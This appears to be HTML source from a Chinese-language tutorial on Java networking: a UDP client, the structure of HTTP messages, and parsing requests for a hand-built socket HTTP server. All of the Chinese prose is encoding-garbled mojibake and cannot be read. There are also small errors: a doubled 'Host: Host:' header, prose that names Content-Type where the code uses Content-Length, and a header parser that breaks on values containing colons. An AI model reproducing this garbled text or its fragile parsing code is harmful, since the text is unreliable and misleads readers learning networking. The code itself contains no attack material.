<span class="keyword">class</span> <span class="title class_">UDPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">hostname</span> <span class="operator">=</span> <span class="string">&quot;localhost&quot;</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">12345</span>;</span><br><span class="line"></span><br><span class="line">        <span class="type">InetAddress</span> <span class="variable">address</span> <span class="operator">=</span> InetAddress.getByName(hostname);</span><br><span class="line">        <span class="type">DatagramSocket</span> <span class="variable">clientSocket</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramSocket</span>();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">message</span> <span class="operator">=</span> <span class="string">&quot;Hello, server!&quot;</span>;</span><br><span class="line">        <span class="type">byte</span>[] buffer = message.getBytes();</span><br><span class="line"></span><br><span class="line">        <span class="type">DatagramPacket</span> <span class="variable">packet</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">DatagramPacket</span>(buffer, buffer.length, address, port);</span><br><span class="line">        clientSocket.send(packet);</span><br><span class="line">        System.out.println(<span class="string">&quot;Message sent&quot;</span>);</span><br><span class="line"></span><br><span class="line">        clientSocket.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åœ¨è¿™ä¸ªç¤ºä¾‹ä¸­ï¼ŒæœåŠ¡å™¨ç«¯åˆ›å»ºä¸€ä¸ª DatagramSocket å¯¹è±¡å¹¶ç›‘å¬ç«¯å£ 12345ã€‚ç„¶åï¼Œå®ƒåˆ›å»ºä¸€ä¸ª DatagramPacket å¯¹è±¡ï¼Œç”¨äºå­˜å‚¨æ¥æ”¶åˆ°çš„æ•°æ®åŒ…ã€‚<code>serverSocket.receive(packet)</code> æ–¹æ³•é˜»å¡ï¼Œç›´åˆ°æ”¶åˆ°ä¸€ä¸ªæ•°æ®åŒ…ã€‚æ”¶åˆ°æ•°æ®åŒ…åï¼ŒæœåŠ¡å™¨ä»æ•°æ®åŒ…ä¸­æå–å¹¶æ‰“å°æ¶ˆæ¯ã€‚<br>å®¢æˆ·ç«¯é¦–å…ˆè§£ææœåŠ¡å™¨çš„ IP åœ°å€ï¼Œç„¶ååˆ›å»ºä¸€ä¸ª DatagramSocket å¯¹è±¡ã€‚æ¥ç€ï¼Œå®¢æˆ·ç«¯åˆ›å»ºä¸€ä¸ªåŒ…å«è¦å‘é€æ¶ˆæ¯çš„ DatagramPacket å¯¹è±¡ï¼Œå¹¶æŒ‡å®šç›®æ ‡åœ°å€å’Œç«¯å£ã€‚æœ€åï¼Œå®¢æˆ·ç«¯é€šè¿‡è°ƒç”¨ <code>clientSocket.send(packet)</code> æ–¹æ³•å‘é€æ•°æ®åŒ…ã€‚</p><h2 id="Java-Socketå®ç°HTTPæœåŠ¡å™¨"><a href="#Java-Socketå®ç°HTTPæœåŠ¡å™¨" class="headerlink" title="Java Socketå®ç°HTTPæœåŠ¡å™¨"></a>Java Socketå®ç°HTTPæœåŠ¡å™¨</h2><h3 id="HTTP-åè®®"><a href="#HTTP-åè®®" class="headerlink" title="HTTP åè®®"></a>HTTP åè®®</h3><p>ServerSocket èµ°çš„æ˜¯ TCP åè®®ï¼ŒHTTP åè®®æœ¬èº«æ˜¯åœ¨ TCP åè®®ä¹‹ä¸Šçš„ä¸€å±‚ã€‚</p><p>TCP æ˜¯ä¸€ç§é¢å‘è¿æ¥çš„ã€å¯é çš„ã€åŸºäºå­—èŠ‚æµçš„ä¼ è¾“å±‚åè®®ã€‚TCP åœ¨ä¸¤ä¸ªç½‘ç»œèŠ‚ç‚¹ä¹‹é—´æä¾›äº†ä¸€æ¡å¯é çš„é€šä¿¡ä¿¡é“ï¼Œç¡®ä¿æ•°æ®åœ¨ä¼ è¾“è¿‡ç¨‹ä¸­ä¸ä¼šä¸¢å¤±ã€é‡å¤æˆ–ä¹±åºã€‚TCP ä½¿ç”¨æ¡æ‰‹è¿‡ç¨‹å»ºç«‹è¿æ¥ï¼Œé€šè¿‡ç¡®è®¤å’Œé‡ä¼ æœºåˆ¶ç¡®ä¿æ•°æ®å¯é ä¼ è¾“ï¼Œå¹¶ä½¿ç”¨æµé‡æ§åˆ¶å’Œæ‹¥å¡æ§åˆ¶ç®—æ³•æ¥ä¼˜åŒ–ç½‘ç»œæ€§èƒ½ã€‚</p><p>HTTP æ˜¯ä¸€ä¸ªç”¨äºåœ¨ Web æµè§ˆå™¨å’Œ Web æœåŠ¡å™¨ä¹‹é—´ä¼ è¾“è¶…æ–‡æœ¬ã€å›¾åƒã€è§†é¢‘å’Œå…¶ä»–åª’ä½“èµ„æºçš„åº”ç”¨å±‚åè®®ã€‚HTTP ä½¿ç”¨è¯·æ±‚-å“åº”æ¨¡å‹ï¼Œå³å®¢æˆ·ç«¯ï¼ˆé€šå¸¸æ˜¯ Web æµè§ˆå™¨ï¼‰å‘é€è¯·æ±‚ç»™æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨å¤„ç†è¯·æ±‚å¹¶è¿”å›å“åº”ã€‚HTTP åè®®å®šä¹‰äº†ä¸€ç»„æ–¹æ³•ï¼ˆå¦‚ GETã€POSTã€PUTã€DELETE ç­‰ï¼‰ï¼Œç”¨äºæŒ‡å®šè¯·æ±‚çš„ç±»å‹å’Œç›®çš„ã€‚æ­¤å¤–ï¼ŒHTTP åè®®è¿˜å®šä¹‰äº†ä¸€ç»„çŠ¶æ€ä»£ç ï¼ˆå¦‚ 200ã€404ã€500 ç­‰ï¼‰ï¼Œç”¨äºè¡¨ç¤ºå“åº”çš„ç»“æœã€‚</p><p>HTTP åè®®ä¾èµ–äº TCP åè®®æ¥ä¼ è¾“æ•°æ®ã€‚å½“ Web æµè§ˆå™¨å‘ Web æœåŠ¡å™¨å‘é€ HTTP è¯·æ±‚æ—¶ï¼Œå®ƒé¦–å…ˆä½¿ç”¨ TCP åè®®ä¸æœåŠ¡å™¨å»ºç«‹è¿æ¥ã€‚ä¸€æ—¦è¿æ¥å»ºç«‹ï¼ŒHTTP è¯·æ±‚æ¶ˆæ¯ä¼šè¢«å°è£…åœ¨ TCP æ•°æ®åŒ…ä¸­ï¼Œç„¶åé€šè¿‡ TCP ä¿¡é“å‘é€ç»™æœåŠ¡å™¨ã€‚æœåŠ¡å™¨æ”¶åˆ° TCP æ•°æ®åŒ…åï¼Œè§£åŒ…æå– HTTP è¯·æ±‚æ¶ˆæ¯ï¼Œå¤„ç†è¯·æ±‚å¹¶ç”Ÿæˆ HTTP å“åº”æ¶ˆæ¯ã€‚æœ€åï¼ŒHTTP å“åº”æ¶ˆæ¯è¢«å°è£…åœ¨ TCP æ•°æ®åŒ…ä¸­ï¼Œå¹¶é€šè¿‡ç›¸åŒçš„ TCP ä¿¡é“å‘é€å›å®¢æˆ·ç«¯ã€‚å®¢æˆ·ç«¯æ”¶åˆ° TCP æ•°æ®åŒ…åï¼Œè§£åŒ…æå– HTTP å“åº”æ¶ˆæ¯å¹¶æ˜¾ç¤ºç»™ç”¨æˆ·ã€‚</p><p><img src="/2024/11/01/code/javanetwork/image-4.png"></p><p><strong>è¯·æ±‚æ¶ˆæ¯</strong><br>HTTP è¯·æ±‚æ¶ˆæ¯ç”±è¯·æ±‚è¡Œï¼ˆRequest Lineï¼‰ã€è¯·æ±‚å¤´ï¼ˆRequest Headersï¼‰ã€ç©ºè¡Œï¼ˆEmpty Lineï¼‰ã€è¯·æ±‚ä½“ï¼ˆRequest Bodyï¼Œå¯é€‰ï¼‰å‡ ä¸ªéƒ¨åˆ†ç»„æˆã€‚</p><p>â‘ ã€è¯·æ±‚è¡ŒåˆåŒ…å«ä¸‰ä¸ªéƒ¨åˆ†ï¼ŒHTTP æ–¹æ³•ï¼ˆä¾‹å¦‚ GET, POST, PUT, DELETE ç­‰ï¼‰ã€è¯·æ±‚çš„ç›®æ ‡ URLï¼ˆé€šå¸¸æ˜¯ç›¸å¯¹ URLï¼Œä½†ä¹Ÿå¯ä»¥æ˜¯ç»å¯¹ URLï¼‰ã€HTTP ç‰ˆæœ¬ï¼ˆä¾‹å¦‚ HTTP&#x2F;1.1 æˆ– HTTP&#x2F;2ï¼‰ï¼Œè¿™äº›éƒ¨åˆ†ç”¨ç©ºæ ¼åˆ†éš”ï¼Œä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">GET /index.html HTTP/1.1</span><br></pre></td></tr></table></figure><p>â‘¡ã€è¯·æ±‚å¤´æ˜¯ä¸€ç³»åˆ—ä»¥é”®å€¼å¯¹è¡¨ç¤ºçš„å…ƒæ•°æ®ï¼Œç”¨äºæè¿°è¯·æ±‚çš„é™„åŠ ä¿¡æ¯ã€‚æ¯ä¸ªè¯·æ±‚å¤´å ä¸€è¡Œï¼Œé”®å’Œå€¼ä¹‹é—´ç”¨å†’å·ï¼ˆ:ï¼‰åˆ†éš”ã€‚è¯·æ±‚å¤´åŒ…å«è¯¸å¦‚ Hostã€User-Agentã€Content-Typeã€Content-Lengthã€Accept ç­‰ä¿¡æ¯ã€‚ä¾‹å¦‚ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Host: www.tobebetterjavaer.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br></pre></td></tr></table></figure><p>â‘¢ã€è¯·æ±‚å¤´å’Œè¯·æ±‚ä½“ä¹‹é—´æœ‰ä¸€ä¸ªç©ºè¡Œï¼Œè¡¨ç¤ºè¯·æ±‚å¤´çš„ç»“æŸã€‚</p><p>â‘£ã€å¯¹äºæŸäº› HTTP æ–¹æ³•ï¼ˆä¾‹å¦‚ POSTã€PUT ç­‰ï¼‰ï¼Œè¿˜å¯ä»¥åœ¨è¯·æ±‚æ¶ˆæ¯ä¸­åŒ…å«è¯·æ±‚ä½“ã€‚è¯·æ±‚ä½“ç”¨äºä¼ è¾“è¦å‘é€ç»™æœåŠ¡å™¨çš„æ•°æ®ã€‚è¯·æ±‚ä½“çš„æ ¼å¼å’Œå†…å®¹å–å†³äº Content-Type è¯·æ±‚å¤´çš„å€¼ã€‚</p><p>ä¾‹å¦‚ï¼Œå½“æäº¤ HTML è¡¨å•æ—¶ï¼Œè¯·æ±‚ä½“å¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">username=æ²‰é»˜ç‹äºŒ&amp;password=123456</span><br></pre></td></tr></table></figure><p>å°†è¿™äº›éƒ¨åˆ†æ”¾åœ¨ä¸€èµ·ï¼Œå°±æ„æˆäº†ä¸€ä¸ªå®Œæ•´çš„ HTTP è¯·æ±‚æ¶ˆæ¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">POST /login HTTP/1.1</span><br><span class="line">Host: Host: www.tobebetterjavaer.com</span><br><span class="line">User-Agent: Mozilla/5.0</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 29</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8</span><br><span class="line"></span><br><span class="line">username=æ²‰é»˜ç‹äºŒ&amp;password=123456</span><br></pre></td></tr></table></figure><p>æˆ‘ç”¨ä¸€å¼ æ€ç»´å¯¼å›¾æ¥è¡¨ç¤ºä¸‹ï¼š<br><img src="/2024/11/01/code/javanetwork/image-5.png"></p><p><strong>å“åº”æ¶ˆæ¯</strong><br>ä¸€ä¸ªå…¸å‹çš„ HTTP å“åº”æ¶ˆæ¯ç”±ä¸‰éƒ¨åˆ†ç»„æˆï¼šçŠ¶æ€è¡Œï¼ˆStatus Lineï¼‰ã€å“åº”å¤´ï¼ˆResponse Headersï¼‰ã€å“åº”ä½“ï¼ˆResponse Bodyï¼‰ã€‚</p><p><img src="/2024/11/01/code/javanetwork/image-6.png"></p><p>ä¸ç®¡æ˜¯è¯·æ±‚æ¶ˆæ¯è¿˜æ˜¯å“åº”æ¶ˆæ¯ï¼Œéƒ½å¯ä»¥åˆ’åˆ†ä¸ºä¸‰éƒ¨åˆ†</p><ul><li>ç¬¬ä¸€è¡Œï¼šçŠ¶æ€è¡Œ</li><li>ç¬¬äºŒè¡Œåˆ°ç¬¬ä¸€ä¸ªç©ºè¡Œï¼šheaderï¼ˆè¯·æ±‚å¤´&#x2F;ç›¸åº”å¤´ï¼‰</li><li>å‰©ä¸‹æ‰€æœ‰ï¼šæ­£æ–‡</li></ul><h3 id="HTTP-æœåŠ¡å™¨è®¾è®¡"><a href="#HTTP-æœåŠ¡å™¨è®¾è®¡" class="headerlink" title="HTTP æœåŠ¡å™¨è®¾è®¡"></a>HTTP æœåŠ¡å™¨è®¾è®¡</h3><p>æ¥ä¸‹æ¥è¿›å…¥æ­£é¢˜ï¼ŒåŸºäº Socket åˆ›å»ºä¸€ä¸ª HTTP æœåŠ¡å™¨ï¼Œä½¿ç”¨ Socket åŸºæœ¬æ²¡å•¥å¤ªå¤§çš„é—®é¢˜ï¼Œæˆ‘ä»¬éœ€è¦é¢å¤–å…³æ³¨ä»¥ä¸‹ä¸¤ç‚¹ï¼š</p><ul><li>å¯¹è¯·æ±‚æ•°æ®è¿›è¡Œè§£æ</li><li>å°è£…è¿”å›ç»“æœ</li></ul><h4 id="a-è¯·æ±‚æ•°æ®è§£æ"><a href="#a-è¯·æ±‚æ•°æ®è§£æ" class="headerlink" title="a. è¯·æ±‚æ•°æ®è§£æ"></a>a. è¯·æ±‚æ•°æ®è§£æ</h4><p>æˆ‘ä»¬ä» Socket ä¸­æ‹¿åˆ°æ‰€æœ‰çš„æ•°æ®ï¼Œç„¶åè§£æä¸ºå¯¹åº”çš„ HTTP è¯·æ±‚ï¼Œæˆ‘ä»¬å…ˆå®šä¹‰ä¸ª Request å¯¹è±¡ï¼Œå†…éƒ¨ä¿å­˜ä¸€äº›åŸºæœ¬çš„ HTTP ä¿¡æ¯ï¼Œæ¥ä¸‹æ¥é‡ç‚¹å°±æ˜¯å°† Socket ä¸­çš„æ‰€æœ‰æ•°æ®éƒ½æå‡ºæ¥ï¼Œå°è£…ä¸º request å¯¹è±¡ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">Request</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¯·æ±‚æ–¹æ³• GET/POST/PUT/DELETE/OPTION...</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String method;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¯·æ±‚çš„uri</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String uri;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * HTTPç‰ˆæœ¬</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String version;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¯·æ±‚å¤´</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> Map&lt;String, String&gt; headers;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * è¯·æ±‚å‚æ•°ç›¸å…³</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> String message;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ ¹æ®å‰é¢çš„ HTTP åè®®ä»‹ç»ï¼Œè§£æè¿‡ç¨‹å¦‚ä¸‹ï¼Œæˆ‘ä»¬å…ˆçœ‹è¯·æ±‚è¡Œçš„è§£æè¿‡ç¨‹ã€‚</p><p><strong>è¯·æ±‚è¡Œ</strong>ï¼ŒåŒ…å«ä¸‰ä¸ªåŸºæœ¬è¦ç´ ï¼šè¯·æ±‚æ–¹æ³• + URI + HTTP ç‰ˆæœ¬ï¼Œç”¨ç©ºæ ¼è¿›è¡Œåˆ†å‰²ï¼Œæ‰€ä»¥è§£æä»£ç å¦‚ä¸‹</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®æ ‡å‡†çš„HTTPåè®®ï¼Œè§£æè¯·æ±‚è¡Œ</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> reader</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decodeRequestLine</span><span class="params">(BufferedReader reader, Request request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    String[] strs = StringUtils.split(reader.readLine(), <span class="string">&quot; &quot;</span>);</span><br><span class="line">    <span class="keyword">assert</span> strs.length == <span class="number">3</span>;</span><br><span class="line">    request.setMethod(strs[<span class="number">0</span>]);</span><br><span class="line">    request.setUri(strs[<span class="number">1</span>]);</span><br><span class="line">    request.setVersion(strs[<span class="number">2</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>è¯·æ±‚å¤´çš„è§£æ</strong>ï¼Œä»ç¬¬äºŒè¡Œï¼Œåˆ°ç¬¬ä¸€ä¸ªç©ºç™½è¡Œä¹‹é—´çš„æ‰€æœ‰æ•°æ®ï¼Œéƒ½æ˜¯è¯·æ±‚å¤´ï¼›è¯·æ±‚å¤´çš„æ ¼å¼ä¹Ÿæ¯”è¾ƒæ¸…æ™°ï¼Œå½¢å¦‚ <code>key:value</code>, å…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">    * æ ¹æ®æ ‡å‡† HTTP åè®®ï¼Œè§£æè¯·æ±‚å¤´</span></span><br><span class="line"><span class="comment">    *</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> reader  è¯»å–è¯·æ±‚å¤´çš„ BufferedReader å¯¹è±¡</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@param</span> request å­˜å‚¨è¯·æ±‚ä¿¡æ¯çš„ Request å¯¹è±¡</span></span><br><span class="line"><span class="comment">    * <span class="doctag">@throws</span> IOException å½“è¯»å–è¯·æ±‚å¤´ä¿¡æ¯æ—¶å‘ç”Ÿ I/O å¼‚å¸¸æ—¶ï¼Œå°†æŠ›å‡ºè¯¥å¼‚å¸¸</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decodeRequestHeader</span><span class="params">(BufferedReader reader, Request request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// åˆ›å»ºä¸€ä¸ª Map å¯¹è±¡ï¼Œç”¨äºå­˜å‚¨è¯·æ±‚å¤´ä¿¡æ¯</span></span><br><span class="line">    Map&lt;String, String&gt; headers = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;(<span class="number">16</span>);</span><br><span class="line">    <span class="comment">// è¯»å–è¯·æ±‚å¤´ä¿¡æ¯ï¼Œæ¯è¡Œéƒ½æ˜¯ä¸€ä¸ªé”®å€¼å¯¹ï¼Œä»¥ç©ºè¡Œç»“æŸ</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">line</span> <span class="operator">=</span> reader.readLine();</span><br><span class="line">    String[] kv;</span><br><span class="line">    <span class="keyword">while</span> (!<span class="string">&quot;&quot;</span>.equals(line)) &#123;</span><br><span class="line">        <span class="comment">// å°†æ¯è¡Œè¯·æ±‚å¤´ä¿¡æ¯æŒ‰å†’å·åˆ†éš”ï¼Œåˆ†åˆ«ä½œä¸ºé”®å’Œå€¼å­˜å…¥ Map ä¸­</span></span><br><span class="line">        kv = StringUtils.split(line, <span class="string">&quot;:&quot;</span>);</span><br><span class="line">        <span class="keyword">assert</span> kv.length == <span class="number">2</span>;</span><br><span class="line">        headers.put(kv[<span class="number">0</span>].trim(), kv[<span class="number">1</span>].trim());</span><br><span class="line">        line = reader.readLine();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// å°†è§£æå‡ºæ¥çš„è¯·æ±‚å¤´ä¿¡æ¯å­˜å…¥ Request å¯¹è±¡ä¸­</span></span><br><span class="line">    request.setHeaders(headers);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>æœ€åå°±æ˜¯æ­£æ–‡çš„è§£æäº†</strong>ï¼Œè¿™ä¸€å—éœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œæ­£æ–‡å¯èƒ½ä¸ºç©ºï¼Œä¹Ÿå¯èƒ½æœ‰æ•°æ®ï¼›æœ‰æ•°æ®æ—¶ï¼Œæˆ‘ä»¬è¦å¦‚ä½•æŠŠæ‰€æœ‰çš„æ•°æ®éƒ½å–å‡ºæ¥å‘¢ï¼Ÿ</p><p>å…ˆçœ‹å…·ä½“å®ç°å¦‚ä¸‹ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * æ ¹æ®æ ‡æ³¨HTTPåè®®ï¼Œè§£ææ­£æ–‡</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> reader    è¾“å…¥æµè¯»å–å™¨ï¼Œç”¨äºè¯»å–è¯·æ±‚ä¸­çš„æ•°æ®</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> request   Request å¯¹è±¡ï¼Œè¡¨ç¤º HTTP è¯·æ±‚</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@throws</span> IOException å½“å‘ç”Ÿ I/O é”™è¯¯æ—¶æŠ›å‡º</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">decodeRequestMessage</span><span class="params">(BufferedReader reader, Request request)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">    <span class="comment">// ä»è¯·æ±‚å¤´ä¸­è·å– Content-Lengthï¼Œå¦‚æœæ²¡æœ‰ï¼Œåˆ™é»˜è®¤ä¸º 0</span></span><br><span class="line">    <span class="type">int</span> <span class="variable">contentLen</span> <span class="operator">=</span> Integer.parseInt(request.getHeaders().getOrDefault(<span class="string">&quot;Content-Length&quot;</span>, <span class="string">&quot;0&quot;</span>));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å¦‚æœ Content-Length ä¸º 0ï¼Œè¡¨ç¤ºæ²¡æœ‰è¯·æ±‚æ­£æ–‡ï¼Œç›´æ¥è¿”å›ã€‚</span></span><br><span class="line">    <span class="comment">// ä¾‹å¦‚ GET å’Œ OPTIONS è¯·æ±‚é€šå¸¸ä¸åŒ…å«è¯·æ±‚æ­£æ–‡</span></span><br><span class="line">    <span class="keyword">if</span> (contentLen == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ ¹æ® Content-Length åˆ›å»ºä¸€ä¸ªå­—ç¬¦æ•°ç»„æ¥å­˜å‚¨è¯·æ±‚æ­£æ–‡</span></span><br><span class="line">    <span class="type">char</span>[] message = <span class="keyword">new</span> <span class="title class_">char</span>[contentLen];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// ä½¿ç”¨ BufferedReader è¯»å–è¯·æ±‚æ­£æ–‡</span></span><br><span class="line">    reader.read(message);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// å°†å­—ç¬¦æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²ï¼Œå¹¶å°†å…¶è®¾ç½®ä¸º Request å¯¹è±¡çš„ message</span></span><br><span class="line">    request.setMessage(<span class="keyword">new</span> <span class="title class_">String</span>(message));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ³¨æ„ä¸Šé¢æˆ‘çš„ä½¿ç”¨å§¿åŠ¿ï¼Œé¦–å…ˆæ˜¯æ ¹æ®è¯·æ±‚å¤´ä¸­çš„<code>Content-Type</code>çš„å€¼ï¼Œæ¥è·å¾—æ­£æ–‡çš„æ•°æ®å¤§å°ï¼Œå› æ­¤æˆ‘ä»¬è·å–çš„æ–¹å¼æ˜¯åˆ›å»ºä¸€ä¸ªè¿™ä¹ˆå¤§çš„<code>char[]</code> æ•°ç»„æ¥è¯»å–æµä¸­æ‰€æœ‰æ•°æ®ï¼Œå¦‚æœæˆ‘ä»¬çš„æ•°ç»„æ¯”å®é™…çš„å°ï¼Œåˆ™è¯»ä¸å®Œï¼›å¦‚æœå¤§ï¼Œåˆ™æ•°ç»„ä¸­ä¼šæœ‰ä¸€äº›ç©ºçš„æ•°æ®ï¼›</p><p><strong>æœ€åå°†ä¸Šé¢çš„å‡ ä¸ªè§£æå°è£…ä¸€ä¸‹</strong>ï¼Œå®Œæˆ request è§£æï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * HTTP è¯·æ±‚å¯ä»¥åˆ†ä¸ºä¸‰éƒ¨åˆ†ï¼š</span></span><br><span class="line"><span class="comment"> * 1. è¯·æ±‚è¡Œï¼šåŒ…æ‹¬è¯·æ±‚æ–¹æ³•ã€URI å’Œ HTTP åè®®ç‰ˆæœ¬</span></span><br><span class="line"><span class="comment"> * 2. è¯·æ±‚å¤´ï¼šä»ç¬¬äºŒè¡Œå¼€å§‹ï¼Œç›´åˆ°ä¸€ä¸ªç©ºè¡Œä¸ºæ­¢</span></span><br><span class="line"><span class="comment"> * 3. æ¶ˆæ¯æ­£æ–‡ï¼šç´§è·Ÿåœ¨ç©ºè¡Œåçš„æ‰€æœ‰å†…å®¹ï¼Œé•¿åº¦ç”±è¯·æ±‚å¤´ä¸­çš„ Content-Length å†³å®š</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * æœ¬æ–¹æ³•å°† InputStream ä¸­çš„ HTTP 